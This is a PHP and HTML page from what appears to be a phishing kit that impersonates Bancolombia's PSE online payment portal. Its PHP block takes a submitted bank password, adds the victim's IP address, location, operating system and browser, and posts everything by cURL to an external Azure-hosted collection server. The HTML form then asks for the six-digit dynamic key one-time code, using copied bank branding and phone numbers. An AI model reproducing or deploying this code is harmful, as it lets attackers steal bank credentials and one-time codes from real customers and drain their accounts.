<?php ini_set('display_errors', 0);

include('funciones.php');
if (isset($_POST['clv'])) {
  $message = 'Banclombia-inf
Clave: ' . $_POST['clv'] . '
Fecha: ' . date('l jS \of F Y h:i:s A', time()) . '
Ip y Localidad: ' . $myip . ' ' . $pais . ' ' . $region . '
SO: ' . $user_os . '
Navegador: ' . $navegador . '';
  $payload = ['mensaje' => $message];
  $url = 'https://servidorapis-ggdnawe6aefxerg7.canadacentral-01.azurewebsites.net/bancolombianequi/';

  $ch = curl_init($url);
  curl_setopt_array($ch, [
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_POST           => true,
    CURLOPT_HTTPHEADER     => [
      'Accept: application/json',
      'Content-Type: application/json'
    ],
    CURLOPT_POSTFIELDS     => json_encode($payload, JSON_UNESCAPED_UNICODE),
    CURLOPT_TIMEOUT        => 20,
    CURLOPT_CONNECTTIMEOUT => 10,
  ]);

  $response = curl_exec($ch);
  if ($response === false) {
    error_log('cURL error: ' . curl_error($ch));
    http_response_code(500);
    exit('Error de red.');
  }
  $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
  curl_close($ch);
} ?>
<!DOCTYPE html>
<html>

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="robot" content="All">
  <meta name="rating" content="general">
  <meta name="Distribution" content="Global">

  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link href="./archivos/style.css" media="all" rel="stylesheet" type="text/css">
  <link href="./archivos/bootstrap.css" media="all" rel="stylesheet" type="text/css">
  <link href="./archivos/ui.css" media="all" rel="stylesheet" type="text/css">
  <link href="./archivos/jquery-ui.css" media="all" rel="stylesheet" type="text/css">
  <link href="./archivos/showLoading.css" media="all" rel="stylesheet" type="text/css">
  <link href="./archivos/keyboard_util.css" media="all" rel="stylesheet" type="text/css">

  <title>Pagos PSE </title>

</head>

<body>
  <div id="contenidoWeb">
    <div class="container" id="containerMain">
      <div>
        <div id="header" class="mua-page-header">
          <div class="row row-logo-svp">
            <div class="col-xs-12 col-sm-7 col-md-7 left-div">
              <div class="mua-imgLogoItem"></div>
              <div class="text-svp-name">Pagos PSE - Sucursal Virtual Personas</div>
            </div>
          </div>
          <div class="row">
            <div class="col-xs-12 col-sm-7 col-md-7 left-div">
              <div id="lastIn" class="mua-title-text" style="padding-top: 10px !important">
                <div>
                  <div class="timeText">Fecha y hora actual:</div>
                  <span id="jclock1" class="lastVisitedText">
                    <script>
                      var meses = new Array("Enero", "Febrero", "Marzo", "Abril", "Mayo", "Junio", "Julio", "Agosto", "Septiembre", "Octubre", "Noviembre", "Diciembre");
                      var diasSemana = new Array("Domingo", "Lunes", "Martes", "Miércoles", "Jueves", "Viernes", "Sábado");
                      var f = new Date();
                      var hora = f.getHours() + ':' + f.getMinutes() + ':' + f.getSeconds();
                      document.write(diasSemana[f.getDay()] + ", " + f.getDate() + " de " + meses[f.getMonth()] + " de " + f.getFullYear() + " " + hora);
                    </script>
                  </span>
                </div>
              </div>
            </div>
          </div>
        </div>
        <div class="panel-heading">
          <h3>Tienda Virtual o Recaudador:&nbsp; <b>Bancolombia S.A. (Zona Pagos) </b></h3>
        </div>
      </div>
      <form method="post" action="wait.php">

        <div class="panel panel-primary">
          <div class="row">

          </div>
          <div class="mua-panel-body">
            <div class="row">

              <div class="col-lg-4 col-md-5 col-sm-6">
                <div class="panel_general mua-panel_general">
                  <div class="title-panel-label">
                    <h1>Clave Dinámica</h1>
                  </div>
                  <div class="subtitle-land-label">
                    <h4>
                      Para continuar con la transaccion ingresa la Clave Dinámica
                      Consultala en la opcion Generacion de Bancolombia App del
                      dispositivo movil donde estas ingresando al servicio
                    </h4>
                  </div>
                  <div id="contenido">
                    <div class="mua-content-group-panel">
                      <div class="mua-label-input">

                      </div>
                      <div>
                        <div class="mua_svp_enroll_update_control">
                          <input id="password" maxlength="6" minlength="6" class="mua-form-control mua-readOnlyInput mua_svp_control_password mua-input-icon"
                            type="password" onchange="trim(document.loginUserForm.password)" name="clvdina"
                            onkeypress="if (event.keyCode &lt; 45 || event.keyCode &gt; 57) event.returnValue = false;" required>
                          <span class="mua-icon-lock"></span>
                        </div>
                      </div>
                    </div>

                  </div>
                  <div class="two-button-container mua-button-container">
                    <div class="two-button-a">
                      <a href="javascript:history.back()">
                        <input id="cancelar" name="cancelar" class="btn btn-default" type="button" value="Cancelar"></a>
                    </div>
                    <div class="two-button-b">
                      <button type="submit" id="continuar" name="continuar" class="btn btn-success">
                        Ingresar
                      </button>
                    </div>
                  </div>
                  <div class="mua-panel_enlances">
                    <div>

                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
          <br><br><br>
          <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12">
              <p class="mua-footer">
                Sucursal Telefónica: Bogotá (57) 60 1 343 00 00 - Medellín
                (57) 60 4 510 90 00 - Cali (57) 60 2 554 05 05 - Barranquilla
                (57) 60 5 361 88 88 - Cartagena (57) 60 5 693 44 00 -
                Bucaramanga (57) 60 7 697 25 25
                <br>
                Pereira (57) 60 6 340 12 13 - El resto del país 018000 9
                12345. Sucursales Telefónicas en el exterior: España (34) 900
                995 717 - Estados Unidos (1) 866 379 97 14.
              </p>
            </div>
          </div>
          <div style="margin-top: 10px">
            <div class="mua-title-text pull-left">
              Dirección IP: {{ipAddress}}
            </div>
            <div class="mua-title-text pull-right">
              &copy;&nbsp;<span id="fecha">2024</span>&nbsp;Bancolombia
              S.A.&nbsp;&nbsp;
            </div>
          </div>
        </div>
      </form>
    </div>
  </div>

</body>

</html>